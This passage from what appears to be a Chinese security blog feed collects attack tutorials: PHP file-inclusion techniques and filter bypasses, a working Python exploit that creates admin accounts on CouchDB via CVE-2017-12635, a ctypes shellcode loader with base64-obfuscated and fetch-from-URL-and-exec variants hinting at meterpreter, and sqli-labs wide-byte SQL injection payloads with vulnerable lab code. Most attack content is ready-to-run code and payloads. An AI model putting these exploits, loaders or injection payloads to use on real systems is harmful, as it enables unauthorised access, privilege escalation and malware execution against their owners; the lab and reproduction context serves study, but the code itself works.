ssh.log其他服务的log</code></pre><p>包含session文件<br>利用条件：session文件路径已知，且其中内容部分可控<br>php的session文件的保存路径可以在phpinfo的session.save_path看到<br><img src="https://s2.ax1x.com/2019/02/03/kGHdMQ.md.png" alt="kGHdMQ.md.png"><br>要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码<br>好像没多少人成功= =</p><p>包含environ<br>要求：php以cgi方式运行，这样environ才会保持UA头，environ文件存储位置已知，且environ文件可读。<br>用法：<br>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p><p>包含fd<br>方法过于复杂<br>参考：<a href="https://www.exploit-db.com/papers/12886/" target="_blank" rel="noopener">shell via LFI - proc/self/environ method</a></p><p>包含上传的文件<br>要求：知道上传的文件名<br>例如这里叫xx.jpg<br><img src="https://s2.ax1x.com/2019/02/04/kJ1O1I.png" alt="kJ1O1I.png"></p><p>包含临时文件<br>php在处理文件上传的时候会先创建一个临时文件<br>条件竞争漏洞+文件包含漏洞</p><p><b>伪协议的利用</b><br>协议：php//filer<br>要求：无<br>用法：base64编码读到的内容，php://filter/convert.base64-encode/resource=文件路径</p><pre><code>php://filter/convert.base64-encode/resource=被包含的文件路径例如http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=/../../../../../Apache/logs/error.log</code></pre><p><img src="https://s2.ax1x.com/2019/02/03/kGHp2F.md.png" alt="kGHp2F.md.png"></p><p>协议：php://input<br>要求：allow_url_include=On,对allow_url_fopen不做要求<br>用法：在存在包含漏洞的请求变量输入php://input 然后用burp抓包，添加你要执行的代码<br><img src="https://s2.ax1x.com/2019/02/04/kJl9r8.md.png" alt="kJl9r8.md.png"></p><p><img src="https://s2.ax1x.com/2019/02/04/kJQ481.png" alt="kJQ481.png"></p><p>协议：php://phar或者zip://<br>要求：php版本等于大于5.3.0<br>用法：创建一个压缩包，然后里面添加个txt，txt里面是php代码。然后在存在包含漏洞的请求变量输入php://rar/压缩包名/压缩包里面的txt<br>注意：windows下必须得知道绝对路径才能使用此协议，而Linux下可以使用相对路径<br><img src="https://s2.ax1x.com/2019/02/04/kJlnMV.md.png" alt="kJlnMV.md.png"></p><p><img src="https://s2.ax1x.com/2019/02/04/kJlRL8.png" alt="kJlRL8.png"></p><p><img src="https://s2.ax1x.com/2019/02/04/kJlqyV.png" alt="kJlqyV.png"></p><p>data:URI schema</p><p>协议名：dataURl schema<br>要求：php版本大于等于php5.2，allow_url_fopen = On，allow_url_include = On<br>用法：在存在包含漏洞的请求参数，输入data:text/plain,&lt;?php 代码 ?&gt;<br><img src="https://s2.ax1x.com/2019/02/04/kJ1AeO.png" alt="kJ1AeO.png"></p><p>执行命令<br><img src="https://s2.ax1x.com/2019/02/04/kJ1EwD.png" alt="kJ1EwD.png"></p><p>以bas64的方式来执行<br>data:text/plain;base64,base64编码的代码<br><img src="https://s2.ax1x.com/2019/02/04/kJ1mYd.png" alt="kJ1mYd.png"></p><p><b>绕过过滤</b><br>指定前缀</p><pre><code class="php">&lt;?phpif(isset($_GET[&#39;file&#39;])){    include &#39;I:\phpstudy\PHPTutorial\WWW&#39;.$_GET[&#39;file&#39;];}?&gt;</code></pre><p>绕过方式：<br>使用相对路径</p><pre><code>http://127.0.0.1/bh.php?file=/../../../../../1.txt</code></pre><p>路径结合起来就是：I:\phpstudy\PHPTutorial\WWW/../../../../../1.txt<br>1txt在I盘根目录，内容是</p><pre><code>16022d6f9581b14aabd64f1476e6bd1a8e119a3a</code></pre><p><img src="https://s2.ax1x.com/2019/02/04/kJ81Ig.png" alt="kJ81Ig.png"></p><p>包含如下：<br><img src="https://s2.ax1x.com/2019/02/04/kJ88iQ.png" alt="kJ88iQ.png"></p><p>过滤../<br>绕过方式：编码绕过</p><pre><code>../%2e%2e%2f..%2f%2e%2e/..\%2e%2e%5c..%5c%2e%2e\二次编码../%252e%252e%252f..\%252e%252e%255c</code></pre><p>指定后缀</p><pre><code class="php">&lt;?phpif(isset($_GET[&#39;file&#39;])){    include $_GET[&#39;file&#39;].&#39;dd.txt&#39;;}?&gt;</code></pre><p>远程文件包含漏洞+？或#绕过<br><img src="https://s2.ax1x.com/2019/02/04/kJGlOx.png" alt="kJGlOx.png"></p><p><img src="https://s2.ax1x.com/2019/02/04/kJG3m6.png" alt="kJG3m6.png"></p><p>利用zip协议<br>注意：这里要用绝对路径,注意压缩包里面的路径<br>拼接后的路径是I:\phpstudy\PHPTutorial\WWW\demo.zip#dd.txt<br>导致能够成功绕过<br><img src="https://s2.ax1x.com/2019/02/04/kJJ8vn.png" alt="kJJ8vn.png"></p><p>第二个例子：</p><pre><code>&lt;?phpif(isset($_GET[&#39;file&#39;])){    include $_GET[&#39;file&#39;].&#39;WWW/dd.txt&#39;;}?&gt;</code></pre><p><img src="https://s2.ax1x.com/2019/02/04/kJY9rq.png" alt="kJY9rq.png"></p><p><img src="https://s2.ax1x.com/2019/02/04/kJJzxs.md.png" alt="kJJzxs.md.png"></p><p>或者用%00截断，不过有些php版本不行</p><p><b>漏洞修补</b><br>设置php.ini里面的allow_url_inclue=Off,allow_url_fopen=off<br>不要让参数可以控制文件包含，如果非要控制的话。就用str_replace()过滤掉.和/那么<br>这两个过滤之后利用也不可能成功了。然后在手动给参数加上.</p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2017-12635 recurrence</title>
      <link href="/posts/c0c88449.html"/>
      <url>/posts/c0c88449.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>复现CVE-2017-12635,今天是大年初一。祝大家新年快乐，个人喜好一个人待在房间里写码，日站过不过年感觉没什么感觉吧<br><img src="https://p.ssl.qhimg.com/t013e381f5ee009a47e.jpg?size=500x281" alt="t013e381f5ee009a47e.jpg?size=500x281"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p><b>漏洞介绍</b><br>Couchdb 垂直权限绕过漏洞（CVE-2017-12635）<br>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。</p><p>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。</p><p>影响版本：小于 1.7.0 以及 小于 2.1.1</p><p>参考链接：</p><p><a href="http://bobao.360.cn/learning/detail/4716.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/4716.html</a><br><a href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html" target="_blank" rel="noopener">https://justi.cz/security/2017/11/14/couchdb-rce-npm.html</a></p><p><b>环境搭建</b><br>进入对应的CVE文件夹</p><pre><code>docker-compose up -d</code></pre><p>搭建好之后访问：<a href="http://127.0.0.15984/_utils/#" target="_blank" rel="noopener">http://127.0.0.15984/_utils/#</a>  ,会出现如下图所示<br><img src="https://s2.ax1x.com/2019/02/05/kY1Kvq.png" alt="kY1Kvq.png"></p><p>我们并不知道账号密码，所以无法登陆</p><p><b>漏洞复现</b></p><p>首先，发送如下数据包：</p><pre><code>PUT /_users/org.couchdb.user:vulhub HTTP/1.1Host: your-ip:5984Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 90{  &quot;type&quot;: &quot;user&quot;,  &quot;name&quot;: &quot;vulhub&quot;,  &quot;roles&quot;: [&quot;_admin&quot;],  &quot;password&quot;: &quot;vulhub&quot;}</code></pre><p>可见，返回403错误：{“error”:”forbidden”,”reason”:”Only _admin may set roles”}，只有管理员才能设置Role角色：<br><img src="https://s2.ax1x.com/2019/02/05/kY1HiQ.md.png" alt="kY1HiQ.md.png"></p><p>发送包含两个roles的数据包，即可绕过限制：<br><img src="https://s2.ax1x.com/2019/02/05/kY1bGj.md.png" alt="kY1bGj.md.png"></p><p><b>利用代码</b></p><pre><code class="python">#author:九世#time:2019/2/5#source:https://vulhub.org/#/environments/couchdb/CVE-2017-12635/import requestsdef cve_2017_12635(urlq,username,password):    urls=str(urlq).strip()+&#39;/_users/org.couchdb.user:{}&#39;.format(username)    headers={&#39;user-agent&#39;:&#39;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#39;,&#39;Content-Type&#39;: &#39;application/json&#39;}    payload = &#39;{&quot;type&quot;: &quot;user&quot;, &quot;name&quot;: &quot;&#39;+username    payload += &#39;&quot;, &quot;roles&quot;: [&quot;_admin&quot;], &quot;roles&quot;: [],&#39;    payload += &#39;&quot;password&quot;: &quot;&#39; + &#39;{}&#39;.format(password)+ &#39;&quot;}&#39;    print(payload)    rqt=requests.put(url=urls,headers=headers,data=payload)    if rqt.status_code==201:        print(&#39;[+] username:{}\n[+] password:{}&#39;.format(username,password))    elif rqt.status_code==409:        print(&#39;[-] Not Found CVE-2017-12635&#39;)    else:        print(&#39;[-] rqt_status_code:{}&#39;.format(rqt.status_code))</code></pre><p>测试：<br><img src="https://s2.ax1x.com/2019/02/05/kY1XMq.md.png" alt=""></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python exec shellcode</title>
      <link href="/posts/a3f2d98a.html"/>
      <url>/posts/a3f2d98a.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里我先吐槽一下，网上用中文搜的python执行shellcode。全部是复制粘贴，棒的我不知道如何下手<br>然后今天早上@即刻安全-Yansu老哥帮我整出来了。老板喝茶<br><img src="http://tama-yura.jp/animetory/img/entries/52846dbee7b659d2ab96736ffaa6ab8d4d8e24d0/53ad87b62d957/pc/15.jpg" alt="15.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>代码我理解不了多少，可能还有错的<br>获取shellcode</p><pre><code class="shell">msfvenom -p windows/x64/exec CMD=calc.exe -f py -o /root/demo.py </code></pre><p>执行shellcode代码如下</p><pre><code class="python">import ctypesimport sysfrom ctypes import *buf =  b&quot;&quot;buf += b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41&quot;buf += b&quot;\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48&quot;buf += b&quot;\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f&quot;buf += b&quot;\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c&quot;buf += b&quot;\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52&quot;buf += b&quot;\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b&quot;buf += b&quot;\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0&quot;buf += b&quot;\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56&quot;buf += b&quot;\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9&quot;buf += b&quot;\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0&quot;buf += b&quot;\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58&quot;buf += b&quot;\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44&quot;buf += b&quot;\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0&quot;buf += b&quot;\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a&quot;buf += b&quot;\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;buf += b&quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00&quot;buf += b&quot;\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41&quot;buf += b&quot;\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41&quot;buf += b&quot;\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06&quot;buf += b&quot;\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a&quot;buf += b&quot;\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65&quot;buf += b&quot;\x78\x65\x00&quot;#这两个微软官方说明是可读可写可执行，PAGE_EXECUTE_READWRITE和VIRTUAL_MEMPAGE_EXECUTE_READWRITE  =  0x00000040 #参数设定VIRTUAL_MEM  =  ( 0x1000 | 0x2000 ) #参数设定buf_arr = bytearray (buf) #shellcode变为一个新的字节数组buf_size = len(buf_arr) #计算shellcode的大小kernel32 = ctypes.cdll.LoadLibrary(&quot;kernel32.dll&quot;) #调用kernel32.dllkernel32.VirtualAlloc.restype = ctypes.c_uint64 #返回类型为c_uint64sc_ptr = kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(buf_size), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE) #设置buf_ptr = (ctypes.c_char * buf_size).from_buffer(buf_arr) #将shellcode指向指针print(sc_ptr)print(buf_ptr)kernel32.RtlMoveMemory(ctypes.c_uint64(sc_ptr),buf_ptr,ctypes.c_int(buf_size)) #调用dll，指向shellcodehandle = kernel32.CreateThread(ctypes.c_int(0),                               ctypes.c_int(0),                               ctypes.c_uint64(sc_ptr),                               ctypes.c_int(0),                               ctypes.c_int(0),                               ctypes.pointer(ctypes.c_int(0)))kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))</code></pre><p>注意：</p><pre><code>这里的shellcode是弹计算器的</code></pre><p><img src="https://s2.ax1x.com/2019/02/03/kGMR8x.md.png" alt="kGMR8x.md.png"></p><p>如果你觉得长的离谱那么，你可以这样执行</p><pre><code class="python">import base64payload=B&quot;aW1wb3J0IGN0eXBlcw0KaW1wb3J0IHN5cw0KZnJvbSBjdHlwZXMgaW1wb3J0ICoNCmJ1ZiA9ICBiIiINCmJ1ZiArPSBiIlx4ZmNceDQ4XHg4M1x4ZTRceGYwXHhlOFx4YzBceDAwXHgwMFx4MDBceDQxXHg1MVx4NDEiDQpidWYgKz0gYiJceDUwXHg1Mlx4NTFceDU2XHg0OFx4MzFceGQyXHg2NVx4NDhceDhiXHg1Mlx4NjBceDQ4Ig0KYnVmICs9IGIiXHg4Ylx4NTJceDE4XHg0OFx4OGJceDUyXHgyMFx4NDhceDhiXHg3Mlx4NTBceDQ4XHgwZiINCmJ1ZiArPSBiIlx4YjdceDRhXHg0YVx4NGRceDMxXHhjOVx4NDhceDMxXHhjMFx4YWNceDNjXHg2MVx4N2MiDQpidWYgKz0gYiJceDAyXHgyY1x4MjBceDQxXHhjMVx4YzlceDBkXHg0MVx4MDFceGMxXHhlMlx4ZWRceDUyIg0KYnVmICs9IGIiXHg0MVx4NTFceDQ4XHg4Ylx4NTJceDIwXHg4Ylx4NDJceDNjXHg0OFx4MDFceGQwXHg4YiINCmJ1ZiArPSBiIlx4ODBceDg4XHgwMFx4MDBceDAwXHg0OFx4ODVceGMwXHg3NFx4NjdceDQ4XHgwMVx4ZDAiDQpidWYgKz0gYiJceDUwXHg4Ylx4NDhceDE4XHg0NFx4OGJceDQwXHgyMFx4NDlceDAxXHhkMFx4ZTNceDU2Ig0KYnVmICs9IGIiXHg0OFx4ZmZceGM5XHg0MVx4OGJceDM0XHg4OFx4NDhceDAxXHhkNlx4NGRceDMxXHhjOSINCmJ1ZiArPSBiIlx4NDhceDMxXHhjMFx4YWNceDQxXHhjMVx4YzlceDBkXHg0MVx4MDFceGMxXHgzOFx4ZTAiDQpidWYgKz0gYiJceDc1XHhmMVx4NGNceDAzXHg0Y1x4MjRceDA4XHg0NVx4MzlceGQxXHg3NVx4ZDhceDU4Ig0KYnVmICs9IGIiXHg0NFx4OGJceDQwXHgyNFx4NDlceDAxXHhkMFx4NjZceDQxXHg4Ylx4MGNceDQ4XHg0NCINCmJ1ZiArPSBiIlx4OGJceDQwXHgxY1x4NDlceDAxXHhkMFx4NDFceDhiXHgwNFx4ODhceDQ4XHgwMVx4ZDAiDQpidWYgKz0gYiJceDQxXHg1OFx4NDFceDU4XHg1ZVx4NTlceDVhXHg0MVx4NThceDQxXHg1OVx4NDFceDVhIg0KYnVmICs9IGIiXHg0OFx4ODNceGVjXHgyMFx4NDFceDUyXHhmZlx4ZTBceDU4XHg0MVx4NTlceDVhXHg0OCINCmJ1ZiArPSBiIlx4OGJceDEyXHhlOVx4NTdceGZmXHhmZlx4ZmZceDVkXHg0OFx4YmFceDAxXHgwMFx4MDAiDQpidWYgKz0gYiJceDAwXHgwMFx4MDBceDAwXHgwMFx4NDhceDhkXHg4ZFx4MDFceDAxXHgwMFx4MDBceDQxIg0KYnVmICs9IGIiXHhiYVx4MzFceDhiXHg2Zlx4ODdceGZmXHhkNVx4YmJceGYwXHhiNVx4YTJceDU2XHg0MSINCmJ1ZiArPSBiIlx4YmFceGE2XHg5NVx4YmRceDlkXHhmZlx4ZDVceDQ4XHg4M1x4YzRceDI4XHgzY1x4MDYiDQpidWYgKz0gYiJceDdjXHgwYVx4ODBceGZiXHhlMFx4NzVceDA1XHhiYlx4NDdceDEzXHg3Mlx4NmZceDZhIg0KYnVmICs9IGIiXHgwMFx4NTlceDQxXHg4OVx4ZGFceGZmXHhkNVx4NjNceDYxXHg2Y1x4NjNceDJlXHg2NSINCmJ1ZiArPSBiIlx4NzhceDY1XHgwMCINCg0KI+i/meS4pOS4quW+rui9r+WumOaWueivtOaYjuaYr+WPr+ivu+WPr+WGmeWPr+aJp+ihjO+8jFBBR0VfRVhFQ1VURV9SRUFEV1JJVEXlkoxWSVJUVUFMX01FTQ0KUEFHRV9FWEVDVVRFX1JFQURXUklURSAgPSAgMHgwMDAwMDA0MCAj5Y+C5pWw6K6+5a6aDQpWSVJUVUFMX01FTSAgPSAgKCAweDEwMDAgfCAweDIwMDAgKSAj5Y+C5pWw6K6+5a6aDQpidWZfYXJyID0gYnl0ZWFycmF5IChidWYpICNzaGVsbGNvZGXlj5jkuLrkuIDkuKrmlrDnmoTlrZfoioLmlbDnu4QNCmJ1Zl9zaXplID0gbGVuKGJ1Zl9hcnIpICPorqHnrpdzaGVsbGNvZGXnmoTlpKflsI8NCmtlcm5lbDMyID0gY3R5cGVzLmNkbGwuTG9hZExpYnJhcnkoImtlcm5lbDMyLmRsbCIpICPosIPnlKhrZXJuZWwzMi5kbGwNCmtlcm5lbDMyLlZpcnR1YWxBbGxvYy5yZXN0eXBlID0gY3R5cGVzLmNfdWludDY0ICPov5Tlm57nsbvlnovkuLpjX3VpbnQ2NA0Kc2NfcHRyID0ga2VybmVsMzIuVmlydHVhbEFsbG9jKGN0eXBlcy5jX2ludCgwKSwgY3R5cGVzLmNfaW50KGJ1Zl9zaXplKSwgVklSVFVBTF9NRU0sIFBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpICPorr7nva4NCmJ1Zl9wdHIgPSAoY3R5cGVzLmNfY2hhciAqIGJ1Zl9zaXplKS5mcm9tX2J1ZmZlcihidWZfYXJyKSAj5bCGc2hlbGxjb2Rl5oyH5ZCR5oyH6ZKIDQpwcmludChzY19wdHIpDQpwcmludChidWZfcHRyKQ0Ka2VybmVsMzIuUnRsTW92ZU1lbW9yeShjdHlwZXMuY191aW50NjQoc2NfcHRyKSxidWZfcHRyLGN0eXBlcy5jX2ludChidWZfc2l6ZSkpICPosIPnlKhkbGzvvIzmjIflkJFzaGVsbGNvZGUNCg0KaGFuZGxlID0ga2VybmVsMzIuQ3JlYXRlVGhyZWFkKGN0eXBlcy5jX2ludCgwKSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdHlwZXMuY19pbnQoMCksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3R5cGVzLmNfdWludDY0KHNjX3B0ciksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3R5cGVzLmNfaW50KDApLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGN0eXBlcy5jX2ludCgwKSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdHlwZXMucG9pbnRlcihjdHlwZXMuY19pbnQoMCkpKQ0Ka2VybmVsMzIuV2FpdEZvclNpbmdsZU9iamVjdChjdHlwZXMuY19pbnQoaGFuZGxlKSxjdHlwZXMuY19pbnQoLTEpKQ==&quot;exec(base64.b64decode(payload))</code></pre><p><img src="https://s2.ax1x.com/2019/02/03/kGMfxK.md.png" alt=""></p><p>在或者说，你可以选择远程读取并执行</p><pre><code class="python">import base64import requestsurl=&#39;http://127.0.0.1/wc.txt&#39;rqt=requests.get(url=url)exec(base64.b64decode(rqt.text))</code></pre><p><img src="https://s2.ax1x.com/2019/02/03/kGMHIA.md.png" alt=""></p><p>如果想获取到meterpreter的话相信诸位都懂的，手动滑稽</p><p>最后还是谢谢Yansu老哥<br>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs less 36 -&gt; sqli-labs less 40</title>
      <link href="/posts/2d92bd8a.html"/>
      <url>/posts/2d92bd8a.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天继续闯sqli-labs，闯到第40关。做个记录<br><img src="http://i1.hdslb.com/bfs/archive/5378b3b12df86f8816a7cd8e400f7b675d88fa52.jpg" alt="5378b3b12df86f8816a7cd8e400f7b675d88fa52.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p><b>第三十六关</b><br>代码如下：</p><pre><code class="mysql">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-36 **Bypass MySQL Real Escape String**&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;5&quot; color=&quot;#00FF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);function check_quotes($string){    $string= mysql_real_escape_string($string);        return $string;}// take the variables if(isset($_GET[&#39;id&#39;])){$id=check_quotes($_GET[&#39;id&#39;]);//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;//logging the connection parameters to a file for analysis.$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);fclose($fp);// connectivity mysql_query(&quot;SET NAMES gbk&quot;);$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);    if($row)    {      echo &#39;&lt;font color= &quot;#00FF00&quot;&gt;&#39;;          echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];      echo &quot;&lt;br&gt;&quot;;      echo &#39;Your Password:&#39; .$row[&#39;password&#39;];      echo &quot;&lt;/font&gt;&quot;;      }    else     {    echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;    print_r(mysql_error());    echo &quot;&lt;/font&gt;&quot;;      }}    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-36.jpg&quot; /&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;&lt;?phpfunction strToHex($string){    $hex=&#39;&#39;;    for ($i=0; $i &lt; strlen($string); $i++)    {        $hex .= dechex(ord($string[$i]));    }    return $hex;}echo &quot;Hint: The Query String you input is escaped as : &quot;.$id .&quot;&lt;br&gt;&quot;;echo &quot;The Query String you input in Hex becomes : &quot;.strToHex($id);?&gt;&lt;/center&gt;&lt;/font&gt; &lt;/body&gt;&lt;/html&gt;</code></pre><p>数据库是gbk编码，使用mysql_real_escape_string()函数过滤了特殊字符，但是由于数据库是gbk编码<br>造成宽字节注入：</p><pre><code>payload:%df&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1) --+</code></pre><p><img src="https://s2.ax1x.com/2019/02/03/kGAPcd.md.png" alt="kGAPcd.md.png"></p><p><b>第三十七关</b><br>代码如下：</p><pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;    &lt;title&gt;Less-37- MySQL_real_escape_string&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:20px;color:#FFF; font-size:24px; text-align:center&quot;&gt; Welcome&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;&lt;div  align=&quot;center&quot; style=&quot;margin:40px 0px 0px 520px;border:20px; background-color:#0CF; text-align:center; width:400px; height:150px;&quot;&gt;&lt;div style=&quot;padding-top:10px; font-size:15px;&quot;&gt;&lt;!--Form to post the data for sql injections Error based SQL Injection--&gt;&lt;form action=&quot;&quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;    &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;        &lt;input type=&quot;text&quot;  name=&quot;uname&quot; value=&quot;&quot;/&gt;    &lt;/div&gt;      &lt;div&gt; Password  : &amp;nbsp;&amp;nbsp;&amp;nbsp;        &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;    &lt;/div&gt;&lt;/br&gt;    &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;    &lt;/div&gt;&lt;/form&gt;&lt;/div&gt;&lt;/div&gt;&lt;div style=&quot; margin-top:10px;color:#FFF; font-size:23px; text-align:center&quot;&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/Less-37.jpg&quot; /&gt;&lt;/center&gt;&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);// take the variablesif(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;])){    $uname1=$_POST[&#39;uname&#39;];    $passwd1=$_POST[&#39;passwd&#39;];        //echo &quot;username before addslashes is :&quot;.$uname1 .&quot;&lt;br&gt;&quot;;        //echo &quot;Input password before addslashes is : &quot;.$passwd1. &quot;&lt;br&gt;&quot;;    //logging the connection parameters to a file for analysis.    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);    fwrite($fp,&#39;User Name:&#39;.$uname1);    fwrite($fp,&#39;Password:&#39;.$passwd1.&quot;\n&quot;);    fclose($fp);        $uname = mysql_real_escape_string($uname1);        $passwd= mysql_real_escape_string($passwd1);        //echo &quot;username after addslashes is :&quot;.$uname .&quot;&lt;br&gt;&quot;;        //echo &quot;Input password after addslashes is : &quot;.$passwd;        // connectivity     mysql_query(&quot;SET NAMES gbk&quot;);    @$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;;    $result=mysql_query($sql);    $row = mysql_fetch_array($result);    if($row)    {          //echo &#39;&lt;font color= &quot;#0000ff&quot;&gt;&#39;;              echo &quot;&lt;br&gt;&quot;;        echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#39;;        //echo &quot; You Have successfully logged in\n\n &quot; ;        echo &#39;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#39;;            echo &quot;&lt;br&gt;&quot;;        echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];        echo &quot;&lt;br&gt;&quot;;        echo &#39;Your Password:&#39; .$row[&#39;password&#39;];        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;/font&gt;&quot;;        